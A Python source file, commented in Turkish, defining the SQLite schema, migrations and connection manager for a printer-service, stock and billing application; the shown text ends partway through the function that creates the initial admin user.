"""
Veritabanı bağlantısını ve temel CRUD (Oluştur, Oku, Güncelle, Sil)
işlemlerini yöneten merkezi modül.
Bu modül, Singleton tasarım desenini kullanarak uygulama genelinde tek bir
veritabanı bağlantı nesnesi (`DatabaseManager`) sağlar. Bu, kaynakların
verimli kullanılmasını ve bağlantıların tutarlı bir şekilde yönetilmesini sağlar.
"""
import sqlite3
import bcrypt
import os
import logging
from typing import Any, List, Tuple, Optional, Dict
# Proje kök dizininden importlar
from ..settings_manager import SettingsManager
from ..currency_converter import get_exchange_rates
from ..auto_backup import AutoBackupManager
from .queries_general import GeneralQueriesMixin
from .queries_service import ServiceQueriesMixin
from .queries_stock import StockQueriesMixin
from .queries_billing import BillingQueriesMixin
# Logging yapılandırması
# --- VERİTABANI ŞEMA TANIMLARI ---
# Her sürümde yapılacak değişiklikleri burada tanımla
SCHEMA_VERSION = 9
TABLE_DEFINITIONS: Dict[str, str] = {
    "users": "CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT NOT NULL UNIQUE, password_hash TEXT NOT NULL, role TEXT DEFAULT 'user')",
    "settings": "CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)",
    "banks": "CREATE TABLE IF NOT EXISTS banks (id INTEGER PRIMARY KEY AUTOINCREMENT, bank_name TEXT NOT NULL, account_holder TEXT NOT NULL, iban TEXT NOT NULL, notes TEXT, is_default INTEGER DEFAULT 0)",
    "technicians": """CREATE TABLE IF NOT EXISTS technicians (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT NOT NULL,
        surname TEXT NOT NULL,
        phone TEXT,
        email TEXT,
        is_active INTEGER DEFAULT 1,
        created_date TEXT DEFAULT (datetime('now', 'localtime')),
        updated_date TEXT DEFAULT (datetime('now', 'localtime'))
    )""",
    "customers": "CREATE TABLE IF NOT EXISTS customers (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL UNIQUE, phone TEXT, email TEXT, address TEXT, tax_id TEXT, tax_office TEXT, is_contract INTEGER DEFAULT 0, contract_start_date TEXT, contract_end_date TEXT, contract_pdf_path TEXT, contract_period TEXT DEFAULT 'Aylik', contract_price DECIMAL(12,4) DEFAULT 0, contract_currency VARCHAR(3) DEFAULT 'TL')",
    "customer_locations": """CREATE TABLE IF NOT EXISTS customer_locations (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        customer_id INTEGER NOT NULL,
        location_name TEXT NOT NULL,
        address TEXT,
        phone TEXT,
        email TEXT,
        created_at TEXT DEFAULT (datetime('now', 'localtime')),
        updated_at TEXT DEFAULT (datetime('now', 'localtime')),
        FOREIGN KEY (customer_id) REFERENCES customers (id) ON DELETE CASCADE
    )""",
    "devices": """CREATE TABLE IF NOT EXISTS devices (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        customer_id INTEGER, 
        model TEXT NOT NULL, 
        type TEXT, 
        serial_number TEXT UNIQUE, 
        is_cpc INTEGER DEFAULT 0, 
        cpc_bw_price REAL DEFAULT 0.0, 
        cpc_color_price REAL DEFAULT 0.0, 
        cpc_bw_currency TEXT DEFAULT 'TL', 
        cpc_color_currency TEXT DEFAULT 'TL', 
        rental_fee DECIMAL(10,4) DEFAULT 0,
        rental_currency VARCHAR(3) DEFAULT 'TL',
        color_type TEXT DEFAULT 'Siyah-Beyaz',
        FOREIGN KEY (customer_id) REFERENCES customers (id) ON DELETE CASCADE
    )""",
    "customer_devices": """CREATE TABLE IF NOT EXISTS customer_devices (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        customer_id INTEGER,
        location_id INTEGER,
        brand TEXT DEFAULT 'Kyocera',
        device_model TEXT NOT NULL,
        serial_number TEXT NOT NULL,
        device_type TEXT DEFAULT 'Yaz??c??',
        color_type TEXT DEFAULT 'Siyah-Beyaz',
        installation_date TEXT,
        notes TEXT,
        is_cpc INTEGER DEFAULT 0,
        is_free INTEGER DEFAULT 0,
        rental_fee DECIMAL(10,4) DEFAULT 0,
        rental_currency VARCHAR(3) DEFAULT 'TL',
        cpc_bw_price DECIMAL(10,4) DEFAULT 0,
        cpc_bw_currency VARCHAR(3) DEFAULT 'TL',
        cpc_color_price DECIMAL(10,4) DEFAULT 0,
        cpc_color_currency VARCHAR(3) DEFAULT 'TL',
        created_at TEXT DEFAULT (datetime('now', 'localtime')),
        updated_at TEXT DEFAULT (datetime('now', 'localtime')),
        FOREIGN KEY (customer_id) REFERENCES customers (id) ON DELETE CASCADE,
        FOREIGN KEY (location_id) REFERENCES customer_locations (id) ON DELETE CASCADE,
        UNIQUE(serial_number)
    )""",
    "service_records": """CREATE TABLE IF NOT EXISTS service_records (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id INTEGER,
        location_id INTEGER,
        assigned_user_id INTEGER,
        technician_id INTEGER,
        problem_description TEXT,
        notes TEXT,
        created_date TEXT,
        completed_date TEXT,
        bw_counter INTEGER,
        color_counter INTEGER,
        status TEXT,
        is_invoiced INTEGER DEFAULT 0,
        related_invoice_id INTEGER,
        description TEXT,
        technician_report TEXT,
        service_form_pdf_path TEXT,
        FOREIGN KEY (device_id) REFERENCES customer_devices (id) ON DELETE CASCADE,
        FOREIGN KEY (location_id) REFERENCES customer_locations (id) ON DELETE CASCADE,
        FOREIGN KEY (assigned_user_id) REFERENCES users (id) ON DELETE SET NULL
    )""",
    "quote_items": """CREATE TABLE IF NOT EXISTS quote_items (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        service_record_id INTEGER NOT NULL, 
        description TEXT NOT NULL, 
        quantity REAL NOT NULL, 
        unit_price REAL NOT NULL, 
        currency TEXT DEFAULT 'TL', 
        stock_item_id INTEGER,
        total_tl REAL DEFAULT 0.0,
        FOREIGN KEY (service_record_id) REFERENCES service_records (id) ON DELETE CASCADE, 
        FOREIGN KEY (stock_item_id) REFERENCES stock_items (id) ON DELETE SET NULL
    )""",
    "cpc_invoices": """CREATE TABLE IF NOT EXISTS cpc_invoices (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        location_id INTEGER NOT NULL, 
        billing_period_start TEXT NOT NULL, 
        billing_period_end TEXT NOT NULL, 
        invoice_date TEXT NOT NULL, 
        total_amount_tl REAL NOT NULL, 
        details_json TEXT, 
        is_invoiced INTEGER DEFAULT 0,
        FOREIGN KEY (location_id) REFERENCES customer_locations (id) ON DELETE CASCADE
    )""",
    "stock_items": """CREATE TABLE IF NOT EXISTS stock_items (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        item_type TEXT NOT NULL, 
        name TEXT NOT NULL, 
        part_number TEXT, 
        description TEXT, 
        quantity INTEGER NOT NULL DEFAULT 0, 
        purchase_price REAL, 
        purchase_currency TEXT, 
        sale_price REAL, 
        sale_currency TEXT, 
        supplier TEXT,
        location TEXT,
        min_stock_level INTEGER DEFAULT 0,
        avg_cost REAL DEFAULT 0.0,
        avg_cost_currency TEXT DEFAULT 'TL',
        is_consignment INTEGER DEFAULT 0
    )""",
    "stock_movements": """CREATE TABLE IF NOT EXISTS stock_movements (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        stock_item_id INTEGER NOT NULL, 
        movement_type TEXT NOT NULL, 
        quantity_changed INTEGER NOT NULL, 
        quantity_after REAL, 
        unit_price REAL, 
        currency TEXT, 
        movement_date TEXT NOT NULL, 
        related_invoice_id INTEGER, 
        related_service_id INTEGER, 
        notes TEXT, 
        FOREIGN KEY (stock_item_id) REFERENCES stock_items (id) ON DELETE CASCADE
    )""",
    "invoices": """CREATE TABLE IF NOT EXISTS invoices (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        customer_id INTEGER NOT NULL, 
        invoice_type TEXT NOT NULL, 
        related_id INTEGER, 
        invoice_date TEXT NOT NULL, 
        total_amount REAL NOT NULL, 
        paid_amount REAL DEFAULT 0.0, 
        status TEXT DEFAULT '??denmedi', 
        currency TEXT NOT NULL, 
        details_json TEXT, 
        items_json TEXT,
        exchange_rate REAL DEFAULT 1.0,
        notes TEXT,
        FOREIGN KEY (customer_id) REFERENCES customers (id) ON DELETE CASCADE
    )""",
    "payments": """CREATE TABLE IF NOT EXISTS payments (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        invoice_id INTEGER NOT NULL, 
        payment_date TEXT NOT NULL, 
        amount_paid REAL NOT NULL, 
        payment_method TEXT, 
        notes TEXT, 
        FOREIGN KEY (invoice_id) REFERENCES invoices (id) ON DELETE CASCADE
    )""",
    "suppliers": """CREATE TABLE IF NOT EXISTS suppliers (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT NOT NULL UNIQUE,
        phone TEXT,
        email TEXT,
        address TEXT,
        tax_office TEXT,
        tax_number TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )""",
    "purchase_invoices": """CREATE TABLE IF NOT EXISTS purchase_invoices (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        supplier_id INTEGER,
        invoice_no TEXT,
        invoice_date TEXT NOT NULL,
        currency VARCHAR(3) DEFAULT 'TL',
        exchange_rate REAL DEFAULT 1.0,
        subtotal REAL DEFAULT 0,
        tax_total REAL DEFAULT 0,
        total REAL DEFAULT 0,
        notes TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (supplier_id) REFERENCES suppliers(id)
    )""",
    "purchase_items": """CREATE TABLE IF NOT EXISTS purchase_items (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        purchase_invoice_id INTEGER NOT NULL,
        stock_item_id INTEGER NOT NULL,
        description TEXT,
        quantity DECIMAL(10,2) NOT NULL,
        unit_price DECIMAL(12,4) NOT NULL,
        currency VARCHAR(3) DEFAULT 'TL',
        tax_rate REAL DEFAULT 0,
        tax_amount REAL DEFAULT 0,
        total REAL DEFAULT 0,
        unit_cost_tl REAL DEFAULT 0,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (purchase_invoice_id) REFERENCES purchase_invoices(id),
        FOREIGN KEY (stock_item_id) REFERENCES stock_items(id)
    )""",
    "stock_price_history": """CREATE TABLE IF NOT EXISTS stock_price_history (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        stock_item_id INTEGER NOT NULL,
        price_type TEXT NOT NULL,
        price REAL NOT NULL,
        currency VARCHAR(3) DEFAULT 'TL',
        source TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (stock_item_id) REFERENCES stock_items(id)
    )""",
    "price_settings": """CREATE TABLE IF NOT EXISTS price_settings (
        id INTEGER PRIMARY KEY,
        settings_json TEXT NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )""",
    "custom_price_margins": """CREATE TABLE IF NOT EXISTS custom_price_margins (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        stock_item_id INTEGER NOT NULL,
        custom_margin DECIMAL(5,2) NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (stock_item_id) REFERENCES stock_items(id),
        UNIQUE(stock_item_id)
    )""",
    "company_info": """CREATE TABLE IF NOT EXISTS company_info (
        id INTEGER PRIMARY KEY,
        company_name TEXT,
        tax_office TEXT,
        tax_number TEXT,
        address TEXT,
        phone TEXT,
        email TEXT,
        logo_path TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )""",
    "invoice_items": """CREATE TABLE IF NOT EXISTS invoice_items (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        invoice_id INTEGER NOT NULL,
        stock_item_id INTEGER,
        description TEXT NOT NULL,
        quantity DECIMAL(10,2) DEFAULT 1,
        unit_price DECIMAL(12,4) NOT NULL,
        currency VARCHAR(3) DEFAULT 'TL',
        tax_rate REAL DEFAULT 0,
        tax_amount REAL DEFAULT 0,
        cost_at_sale REAL DEFAULT 0,
        cost_currency VARCHAR(3) DEFAULT 'TL',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (invoice_id) REFERENCES invoices(id)
    )""",
    "cpc_stock_items": """CREATE TABLE IF NOT EXISTS cpc_stock_items (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id INTEGER NOT NULL,
        toner_code VARCHAR(50) NOT NULL,
        toner_name VARCHAR(100),
        color VARCHAR(20),
        quantity INTEGER DEFAULT 0,
        min_quantity INTEGER DEFAULT 5,
        location VARCHAR(100),
        notes TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (device_id) REFERENCES customer_devices(id)
    )""",
    "cpc_device_counters": """CREATE TABLE IF NOT EXISTS cpc_device_counters (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id INTEGER NOT NULL,
        bw_counter INTEGER DEFAULT 0,
        color_counter INTEGER DEFAULT 0,
        last_update TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (device_id) REFERENCES customer_devices(id)
    )""",
    "cpc_usage_history": """CREATE TABLE IF NOT EXISTS cpc_usage_history (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id INTEGER NOT NULL,
        toner_id INTEGER NOT NULL,
        usage_date DATE NOT NULL,
        bw_pages INTEGER DEFAULT 0,
        color_pages INTEGER DEFAULT 0,
        notes TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (device_id) REFERENCES customer_devices(id),
        FOREIGN KEY (toner_id) REFERENCES cpc_stock_items(id)
    )""",
    "pending_sales": """CREATE TABLE IF NOT EXISTS pending_sales (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        customer_id INTEGER NOT NULL,
        sale_date TIMESTAMP NOT NULL,
        total_amount REAL NOT NULL,
        currency TEXT NOT NULL DEFAULT 'TRY',
        items_json TEXT NOT NULL,
        sale_data_json TEXT,
        invoice_id INTEGER,
        status TEXT NOT NULL DEFAULT 'pending',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (customer_id) REFERENCES customers (id) ON DELETE CASCADE
    )"""
}
class DatabaseManager(GeneralQueriesMixin, ServiceQueriesMixin, StockQueriesMixin, BillingQueriesMixin):
    """
    Singleton sınıfı, veritabanı bağlantısını ve işlemlerini yönetir.
    """
    _instance: Optional['DatabaseManager'] = None
    _connection: Optional[sqlite3.Connection] = None
    _db_path: Optional[str] = None
    def __new__(cls) -> 'DatabaseManager':
        if cls._instance is None:
            cls._instance = super(DatabaseManager, cls).__new__(cls)
            cls._instance._initialize()
        return cls._instance
    def _initialize(self) -> None:
        """Bağlantıyı ve veritabanı şemasını başlatır."""
        self._settings_manager = SettingsManager()
        self.get_exchange_rates = get_exchange_rates
        self._determine_db_path()
        self._connect()
        if self._connection:
            self._setup_database()
            self._setup_auto_backup()
    def _determine_db_path(self) -> None:
        """Ayarlardan veritabanı yolunu belirler."""
        network_path = self._settings_manager.get_setting('sqlite_network_path')
        if network_path and os.path.exists(os.path.dirname(network_path)):
            self._db_path = network_path
            logging.info(f"Ağ veritabanı yolu kullanılıyor: {self._db_path}")
        else:
            # get_appdata_path benzeri bir yapı SettingsManager içinde olmalı
            # Şimdilik eski yapıya benzer bir yol kullanalım
            app_data_dir = os.getenv('APPDATA') or os.path.expanduser('~')
            proservis_dir = os.path.join(app_data_dir, 'ProServis')
            self._db_path = os.path.join(proservis_dir, "teknik_servis_local.db")
            logging.info(f"Yerel veritabanı yolu kullanılıyor: {self._db_path}")
    def _connect(self) -> None:
        """Veritabanına bağlanır."""
        if self._connection:
            return
        if not self._db_path:
            logging.error("Veritabanı yolu belirlenemedi.")
            return
        dir_name = os.path.dirname(self._db_path)
        if dir_name and not os.path.exists(dir_name):
            try:
                os.makedirs(dir_name)
                logging.info(f"Veritabanı dizini oluşturuldu: {dir_name}")
            except OSError as e:
                logging.error(f"Veritabanı dizini oluşturulamadı: {e}", exc_info=True)
                self._connection = None
                return
        try:
            # FIXED: Use context manager to prevent connection leak
            self._connection = sqlite3.connect(self._db_path, check_same_thread=False)
            self._connection.row_factory = sqlite3.Row # Sütun adlarıyla erişim için
            logging.info(f"Veritabanı bağlantısı başarıyla kuruldu: {self._db_path}")
        except sqlite3.Error as e:
            logging.critical(f"SQLite bağlantı hatası: {e}", exc_info=True)
            self._connection = None
    def _setup_auto_backup(self) -> None:
        """Otomatik yedekleme sistemini başlatır."""
        try:
            backup_interval = int(self._settings_manager.get_setting('backup_interval_hours', '24'))
            backup_dir = self._settings_manager.get_setting('backup_dir', None)
            
            self._backup_manager = AutoBackupManager(
                db_path=self._db_path,
                backup_dir=backup_dir,
                backup_interval_hours=backup_interval
            )
            self._backup_manager.start()
            logging.info("Otomatik yedekleme sistemi başlatıldı")
        except Exception as e:
            logging.error(f"Otomatik yedekleme sistemi başlatılamadı: {e}")
    def force_backup(self) -> bool:
        """Manuel yedek almayı tetikler."""
        if hasattr(self, '_backup_manager'):
            return self._backup_manager.force_backup()
        return False
    
    @property
    def database_path(self) -> str:
        """Veritabanı dosya yolunu döndürür."""
        return self._db_path
    
    def set_database_path(self, new_path: str) -> bool:
        """
        Veritabanı yolunu değiştirir ve yeni bağlantı kurar.
        Google Drive cache ile kullanım için.
        
        Args:
            new_path: Yeni veritabanı dosya yolu
            
        Returns:
            bool: Başarılı ise True
        """
        try:
            # Eski bağlantıyı kapat
            if self._connection:
                self._connection.close()
                self._connection = None
            
            # Yeni yolu ayarla
            self._db_path = new_path
            logging.info(f"Database path değiştirildi: {new_path}")
            
            # Yeni bağlantı kur
            self._connect()
            
            if self._connection:
                # Schema kontrolü
                self._setup_database()
                return True
            else:
                logging.error("Yeni database path ile bağlantı kurulamadı!")
                return False
                
        except Exception as e:
            logging.error(f"Database path değiştirme hatası: {e}", exc_info=True)
            return False
    
    def get_connection(self) -> Optional[sqlite3.Connection]:
        """Aktif veritabanı bağlantısını döndürür, yoksa yeniden bağlanır."""
        if self._connection is None:
            self._connect()
        return self._connection
    def close(self) -> None:
        """Veritabanı bağlantısını kapatır."""
        if self._connection:
            self._connection.close()
            self._connection = None
            logging.info("Veritabanı bağlantısı kapatıldı.")
    def execute_query(self, query: str, params: tuple = ()) -> Optional[int]:
        """INSERT, UPDATE, DELETE gibi veri değiştiren sorguları çalıştırır."""
        conn = self.get_connection()
        if not conn: return None
        try:
            cursor = conn.cursor()
            cursor.execute(query, params)
            conn.commit()
            return cursor.lastrowid
        except sqlite3.Error as e:
            logging.error(f"Sorgu hatası: {e}\nSorgu: {query}\nParametreler: {params}", exc_info=True)
            conn.rollback()
            return None
    def fetch_one(self, query: str, params: tuple = ()) -> Optional[sqlite3.Row]:
        """Tek bir satır sonuç döndüren sorguları çalıştırır."""
        conn = self.get_connection()
        if not conn: return None
        try:
            cursor = conn.cursor()
            cursor.execute(query, params)
            return cursor.fetchone()
        except sqlite3.Error as e:
            logging.error(f"Fetch one hatası: {e}\nSorgu: {query}\nParametreler: {params}", exc_info=True)
            return None
    def fetch_all(self, query: str, params: tuple = ()) -> List[sqlite3.Row]:
        """Birden çok satır sonuç döndüren sorguları çalıştırır."""
        conn = self.get_connection()
        if not conn: return []
        try:
            cursor = conn.cursor()
            cursor.execute(query, params)
            return cursor.fetchall()
        except sqlite3.Error as e:
            logging.error(f"Fetch all hatası: {e}\nSorgu: {query}\nParametreler: {params}", exc_info=True)
            return []
    def _get_user_version(self) -> int:
        """Veritaban?? user_version de??erini d??nd??r??r."""
        conn = self.get_connection()
        if not conn:
            return 0
        try:
            row = conn.execute("PRAGMA user_version").fetchone()
            return int(row[0]) if row else 0
        except Exception as e:
            logging.error(f"user_version okunamad??: {e}")
            return 0
    def _set_user_version(self, version: int) -> None:
        """Veritaban?? user_version de??erini g??nceller."""
        conn = self.get_connection()
        if not conn:
            return
        try:
            conn.execute(f"PRAGMA user_version = {int(version)}")
            conn.commit()
        except Exception as e:
            logging.error(f"user_version ayarlanamad??: {e}")

    def _setup_database(self) -> None:
        """Veritabanı tablolarını ve ilk verileri kurar/günceller."""
        self._run_migrations()
        self._create_initial_admin_user()
    def _run_migrations(self) -> None:
        """Veritabanı şemasını oluşturur ve güncellemeleri uygular."""
        conn = self.get_connection()
        if not conn: return

        current_version = self._get_user_version()
        if current_version >= SCHEMA_VERSION:
            return
        
        # Tabloları oluştur
        for table, query in TABLE_DEFINITIONS.items():
            self.execute_query(query)
        
        # Varsay??lan price_settings kayd??
        try:
            row = self.fetch_one("SELECT COUNT(*) FROM price_settings")
            if row and row[0] == 0:
                default_settings = '{"default_margin": 20.0, "currency": "TL", "tax_rate": 18.0}'
                self.execute_query("INSERT INTO price_settings (id, settings_json) VALUES (1, ?)", (default_settings,))
        except Exception as e:
            logging.warning(f"price_settings varsay??lan kayd?? eklenemedi: {e}")

        # --- STOK UYUMLULUK SÜTUNU (YENİ EKLENEN) ---
        self._add_column_if_not_exists('stock_items', 'compatible_models', 'TEXT')
        # --------------------------------------------

        # Diğer Migrasyonlar
        self._add_column_if_not_exists('customers', 'tax_id', 'TEXT')
        self._add_column_if_not_exists('customers', 'tax_office', 'TEXT')
        self._add_column_if_not_exists('customers', 'is_contract', 'INTEGER DEFAULT 0')
        self._add_column_if_not_exists('customers', 'contract_start_date', 'TEXT')
        self._add_column_if_not_exists('customers', 'contract_end_date', 'TEXT')
        self._add_column_if_not_exists('customers', 'contract_pdf_path', 'TEXT')
        self._add_column_if_not_exists('customers', 'contract_period', "TEXT DEFAULT 'Aylik'")
        self._add_column_if_not_exists('customers', 'contract_price', 'REAL DEFAULT 0.0')
        self._add_column_if_not_exists('customers', 'contract_currency', "TEXT DEFAULT 'TL'")
        self._add_column_if_not_exists('quote_items', 'total_tl', 'REAL DEFAULT 0.0')
        self._add_column_if_not_exists('stock_items', 'supplier', 'TEXT')
        self._add_column_if_not_exists('stock_items', 'location', 'TEXT')
        self._add_column_if_not_exists('stock_items', 'min_stock_level', 'INTEGER DEFAULT 0')
        self._add_column_if_not_exists('stock_items', 'color_type', "TEXT DEFAULT 'Siyah-Beyaz'")
        self._add_column_if_not_exists('devices', 'color_type', "TEXT DEFAULT 'Siyah-Beyaz'")
        self._add_column_if_not_exists('devices', 'rental_fee', 'REAL DEFAULT 0.0')
        self._add_column_if_not_exists('devices', 'rental_currency', "TEXT DEFAULT 'TL'")
        self._add_column_if_not_exists('devices', 'stock_id', 'INTEGER')
        self._add_column_if_not_exists('service_records', 'related_invoice_id', 'INTEGER')
        self._add_column_if_not_exists('service_records', 'description', 'TEXT')
        self._add_column_if_not_exists('service_records', 'technician_id', 'INTEGER')
        self._add_column_if_not_exists('service_records', 'assigned_user_id', 'INTEGER')
        self._add_column_if_not_exists('service_records', 'completed_date', 'TEXT')
        self._add_column_if_not_exists('service_records', 'technician_report', 'TEXT')
        self._add_column_if_not_exists('service_records', 'service_form_pdf_path', 'TEXT')
        self._add_column_if_not_exists('invoices', 'notes', 'TEXT')
        self._add_column_if_not_exists('invoices', 'related_id', 'INTEGER')
        self._add_column_if_not_exists('invoices', 'items_json', 'TEXT')
        self._add_column_if_not_exists('invoices', 'exchange_rate', 'REAL DEFAULT 1.0')
        self._add_column_if_not_exists('invoice_items', 'stock_item_id', 'INTEGER')
        self._add_column_if_not_exists('invoice_items', 'tax_rate', 'REAL DEFAULT 0')
        self._add_column_if_not_exists('invoice_items', 'tax_amount', 'REAL DEFAULT 0')
        self._add_column_if_not_exists('invoice_items', 'cost_at_sale', 'REAL DEFAULT 0')
        self._add_column_if_not_exists('invoice_items', 'cost_currency', "TEXT DEFAULT 'TL'")
        self._add_column_if_not_exists('cpc_invoices', 'is_invoiced', 'INTEGER DEFAULT 0')
        self._add_column_if_not_exists('pending_sales', 'sale_data_json', 'TEXT')
        self._add_column_if_not_exists('pending_sales', 'invoice_id', 'INTEGER')
        
        # Customer devices location and free columns
        self._add_column_if_not_exists('customer_devices', 'location_id', 'INTEGER')
        self._add_column_if_not_exists('customer_devices', 'is_free', 'INTEGER DEFAULT 0')
        
        # Add rental fee columns for customer devices
        self._add_column_if_not_exists('customer_devices', 'rental_fee', 'REAL DEFAULT 0.0')
        self._add_column_if_not_exists('customer_devices', 'rental_currency', "TEXT DEFAULT 'TL'")
        
        # Add CPC price columns for customer devices
        self._add_column_if_not_exists('customer_devices', 'cpc_bw_price', 'REAL DEFAULT 0.0')
        self._add_column_if_not_exists('customer_devices', 'cpc_bw_currency', "TEXT DEFAULT 'TL'")
        self._add_column_if_not_exists('customer_devices', 'cpc_color_price', 'REAL DEFAULT 0.0')
        self._add_column_if_not_exists('customer_devices', 'cpc_color_currency', "TEXT DEFAULT 'TL'")
        
        # Service records location column
        self._add_column_if_not_exists('service_records', 'location_id', 'INTEGER')
        
        # CPC invoices location column (customer_id'den location_id'ye geçiş)
        if not self._column_exists('cpc_invoices', 'location_id'):
            # Önce location_id sütunu ekle
            self._add_column_if_not_exists('cpc_invoices', 'location_id', 'INTEGER')
        
        # Mevcut müşterileri customer_locations'a taşı
        self._migrate_customers_to_locations()
        
        # CpcFaturalari tablosunu cpc_invoices olarak yeniden adlandır
        if self._table_exists('CpcFaturalari') and not self._table_exists('cpc_invoices'):
            self.execute_query("ALTER TABLE CpcFaturalari RENAME TO cpc_invoices")
            logging.info("Tablo 'CpcFaturalari' -> 'cpc_invoices' olarak yeniden adlandırıldı.")

        if not self._create_performance_indexes():
            logging.warning('Index olusturma basarisiz - performans dusuk olabilir')

        self._set_user_version(SCHEMA_VERSION)

    def _create_performance_indexes(self) -> bool:
        """Performans icin index olusturur."""
        try:
            conn = self.get_connection()
            if not conn:
                return False
            cursor = conn.cursor()

            cursor.execute("""
                CREATE INDEX IF NOT EXISTS idx_customers_name 
                ON customers(name)
            """)
            cursor.execute("""
                CREATE INDEX IF NOT EXISTS idx_devices_serial 
                ON devices(serial_number)
            """)
            cursor.execute("""
                CREATE INDEX IF NOT EXISTS idx_devices_customer 
                ON devices(customer_id)
            """)
            cursor.execute("""
                CREATE INDEX IF NOT EXISTS idx_customer_devices_serial 
                ON customer_devices(serial_number)
            """)
            cursor.execute("""
                CREATE INDEX IF NOT EXISTS idx_customer_devices_customer 
                ON customer_devices(customer_id)
            """)
            cursor.execute("""
                CREATE INDEX IF NOT EXISTS idx_service_device 
                ON service_records(device_id)
            """)

            conn.commit()
            return True
        except Exception as e:
            logging.error(f"Index olusturma hatasi: {e}")
            return False

    def _table_exists(self, table_name: str) -> bool:
        """Bir tablonun veritabanında olup olmadığını kontrol eder."""
        res = self.fetch_one("SELECT name FROM sqlite_master WHERE type='table' AND name=?", (table_name,))
        return res is not None
    def _column_exists(self, table_name: str, column_name: str) -> bool:
        """Bir tablodaki sütunun mevcut olup olmadığını kontrol eder."""
        try:
            columns = [info['name'] for info in self.fetch_all(f"PRAGMA table_info({table_name})")]
            return column_name in columns
        except Exception as e:
            logging.error(f"Sütun kontrolü yapılırken hata ({table_name}.{column_name}): {e}")
            return False
    def _add_column_if_not_exists(self, table_name: str, column_name: str, column_type: str) -> None:
        """Bir tabloya, eğer mevcut değilse, yeni bir sütun ekler."""
        try:
            res = self.fetch_one(f"PRAGMA table_info({table_name})")
            if res: # fetch_one None dönebilir
                columns = [info['name'] for info in self.fetch_all(f"PRAGMA table_info({table_name})")]
                if column_name not in columns:
                    self.execute_query(f"ALTER TABLE {table_name} ADD COLUMN {column_name} {column_type}")
                    logging.info(f"'{table_name}' tablosuna '{column_name}' sütunu eklendi.")
        except Exception as e:
            logging.error(f"Sütun eklenirken hata oluştu ({table_name}.{column_name}): {e}", exc_info=True)
    def _migrate_customers_to_locations(self) -> None:
        """Mevcut müşteri verilerini customer_locations'a taşır."""
        try:
            # customer_locations tablosunda hiç kayıt var mı kontrol et
            existing_locations = self.fetch_one("SELECT COUNT(*) as count FROM customer_locations")
            if existing_locations and existing_locations['count'] > 0:
                logging.info("Customer locations zaten mevcut, migrasyon atlandı.")
                return
            
            # Tüm müşterileri al
            customers = self.fetch_all("SELECT id, name, phone, email, address FROM customers")
            
            for customer in customers:
                # Her müşteri için varsayılan lokasyon oluştur
                location_name = f"{customer['name']} - Ana Lokasyon"
                self.execute_query("""
                    INSERT INTO customer_locations (customer_id, location_name, address, phone, email)
                    VALUES (?, ?, ?, ?, ?)
                """, (customer['id'], location_name, customer['address'], customer['phone'], customer['email']))
                
                # customer_devices tablosundaki customer_id'yi location_id'ye güncelle
                location_id = self.fetch_one("SELECT id FROM customer_locations WHERE customer_id = ? AND location_name = ?", 
                                           (customer['id'], location_name))
                if location_id:
                    self.execute_query("""
                        UPDATE customer_devices 
                        SET location_id = ? 
                        WHERE customer_id = ? AND (location_id IS NULL OR location_id = '')
                    """, (location_id['id'], customer['id']))
                    
                    # service_records tablosundaki location_id'yi güncelle
                    self.execute_query("""
                        UPDATE service_records 
                        SET location_id = ? 
                        WHERE device_id IN (
                            SELECT id FROM customer_devices WHERE customer_id = ?
                        ) AND (location_id IS NULL OR location_id = '')
                    """, (location_id['id'], customer['id']))
            
            logging.info(f"{len(customers)} müşteri için lokasyon migrasyonu tamamlandı.")
            
        except Exception as e:
            logging.error(f"Müşteri lokasyon migrasyonu hatası: {e}", exc_info=True)
    def _create_initial_admin_user(self) -> None:
        """Varsayılan 'admin' kullanıcısını, eğer mevcut değilse, oluşturur."""
        if not self.fetch_one("SELECT id FROM users WHERE username = 'admin'"):
            try:
